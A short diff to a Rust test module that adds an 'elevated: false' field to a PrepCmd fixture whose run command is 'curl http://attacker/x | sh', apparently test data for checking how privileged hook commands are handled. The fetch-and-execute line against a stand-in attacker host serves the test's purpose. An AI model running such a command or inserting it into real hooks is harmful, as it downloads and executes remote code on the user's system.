@@ -1299,6 +1299,7 @@ mod tests {
         let prep = vec![crate::hooks::PrepCmd {
             run: "curl http://attacker/x | sh".into(),
             undo: None,
+            elevated: false,
         }];
 
         assert_eq!(privileged_field(Some(&cmd), &[]), Some("launch.kind"));
